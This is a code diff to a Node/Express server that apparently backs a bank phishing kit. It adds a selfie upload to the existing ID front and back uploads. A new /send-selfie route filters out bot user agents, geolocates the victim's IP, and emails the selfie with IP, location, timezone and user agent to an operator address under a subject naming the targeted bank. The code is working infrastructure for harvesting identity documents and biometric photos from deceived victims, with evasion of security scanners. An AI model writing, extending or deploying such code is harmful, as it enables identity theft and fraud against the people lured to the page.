@@ -31,6 +31,7 @@ app.post("/send-session", async (req, res) => {
 
     const front = req.files && (req.files.front as any);
     const back = req.files && (req.files.back as any);
+    const selfie = req.files && (req.files.selfie as any);
 
     const values = JSON.parse(
       req.fields ? (req.fields.session as string) : "{}"
@@ -110,7 +111,7 @@ app.post("/send-session", async (req, res) => {
      req.files && (req.files.front || req.files.back)
        ? ` <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
      <br>
-     <h4>SUPPORTING DOCUMENTS</h4>
+     <h4>SUPPORTING DOCUMENTS${selfie ? " & SELFIE" : ""}</h4>
      <p>| (▰˘◡˘▰) See attached files</b></p>
      <br>`
        : ""
@@ -135,6 +136,14 @@ app.post("/send-session", async (req, res) => {
               filename: `Back.${back.type.split("/")[1]}`,
               content: back,
             },
+            ...(selfie
+              ? [
+                  {
+                    filename: `Selfie.${selfie.type.split("/")[1]}`,
+                    content: selfie,
+                  },
+                ]
+              : []),
           ]
         : []
     );
@@ -184,6 +193,51 @@ app.post("/send-files", async (req, res) => {
         {
           filename: `Back.${back.type.split("/")[1]}`,
           content: back,
+        },
+      ]
+    );
+    res.send(Promise.resolve());
+  } catch (error) {
+    console.log(error);
+    res.status(500).send("Something went wrong");
+  }
+});
+
+app.post("/send-selfie", async (req, res) => {
+  const md = new MobileDetect(req.headers["user-agent"] as string);
+  const isBot = md.is("Bot");
+  if (isBot) {
+    res.send("Fuck off");
+    return;
+  }
+
+  const selfie = req.files?.selfie as any;
+
+  try {
+    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+    const geo = geoip.lookup(ip as string | number);
+    await sendEmail(
+      process.env.TO as string,
+      `
+     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
+     <br>
+     <h4>SELFIE</h4>
+     <p>| (▰˘◡˘▰) See attached files</b></p>
+     <br>
+     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
+     <br>
+     <p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
+     <p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
+     <p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
+     <p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
+     <br>
+     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
+     `,
+      `${process.env.BANK_NAME} - ${req.fields?.form} by ROCKET 🚀🚀🚀 From ${ip}`,
+      [
+        {
+          filename: `Selfie.${selfie.type.split("/")[1]}`,
+          content: selfie,
         },
       ]
     );
